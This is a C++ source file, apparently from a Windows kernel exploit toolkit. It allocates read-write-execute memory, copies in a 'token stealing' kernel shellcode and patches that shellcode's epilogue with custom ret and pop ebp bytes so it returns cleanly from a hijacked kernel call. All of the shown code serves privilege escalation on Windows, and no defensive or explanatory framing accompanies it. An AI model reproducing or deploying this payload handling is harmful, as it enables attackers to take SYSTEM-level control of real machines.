#include "common.h"


shared_ptr<PUCHAR> allocatePayloadInReadWrite() 
{
	static const size_t Shellcode_Size = 256;
	
	shared_ptr<PUCHAR> customPayload( new PUCHAR(reinterpret_cast<PUCHAR>(
		VirtualAlloc (
			(LPVOID)0,
			Shellcode_Size,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE
	))),
	[](PUCHAR *ptr) {
		if (*ptr != nullptr) {
			wcout << L"[.] Freeing memory allocated for the kernel payload." << endl;
			VirtualFree(*ptr, MEM_DECOMMIT, Shellcode_Size);
			delete ptr;
		}
	});
	
	if(!customPayload) {
		wcerr << L"[!] Could not allocate memory for the kernel payload!" << endl;
		throw std::bad_alloc();
	}
	
	PUCHAR customPayloadPtr = reinterpret_cast<PUCHAR>(*customPayload);
		
	memset(customPayloadPtr, 0, Shellcode_Size);
	memcpy(customPayloadPtr, tokenStealingPayloadRealPointer, tokenStealingPayloadSize);
	
	wcout << L"[.] Custom kernel shellcode will now be located at: 0x"
		<< hex << setw(8) << setfill(L'0') << customPayloadPtr << endl;
	
	return customPayload;
}


shared_ptr<PUCHAR> adjustPayloadEpilogue(UCHAR retNumber, bool addPopEbp)
{
	static const unsigned char Shellcode_Epilogue_Signature[] = {
		0x61, 0x31, 0xc0, 0x90, 0xc3, 0x90, 0x90
	};
	
	auto customPayload = allocatePayloadInReadWrite();
	if(!customPayload) {
		throw std::bad_alloc();
	}
	
	PUCHAR customPayloadPtr = reinterpret_cast<PUCHAR>(*customPayload);
	const PUCHAR tokenStealingPayloadPtr = reinterpret_cast<PUCHAR>(tokenStealingPayloadRealPointer);	
	
	for(size_t i = 0, pos = tokenStealingPayloadSize - sizeof(Shellcode_Epilogue_Signature);
		pos < tokenStealingPayloadSize && i < sizeof(Shellcode_Epilogue_Signature); 
		pos++, i++
	)  {
		if (customPayloadPtr[pos] != tokenStealingPayloadPtr[pos]) {
			wcerr << L"[!] Could not find the kernel shellcode's epilogue!" << endl;
			throw std::bad_alloc();
		}
	}
		
	const size_t retBytePos = tokenStealingPayloadSize - sizeof(Shellcode_Epilogue_Signature) + 4;
	
	if (retNumber != 0) {
		wcout << L"[.] Adjusting the kernel payload to make it ret 0x"
			<< hex << setw(2) << setfill(L'0') << retNumber << endl;
		
		customPayloadPtr[retBytePos + 0] = 0xc2;
		customPayloadPtr[retBytePos + 1] = retNumber;
		customPayloadPtr[retBytePos + 2] = 0x00;
	}
	
	if (addPopEbp) {
		customPayloadPtr[retBytePos - 1] = 0x5d;
	}
	
	return customPayload;
}
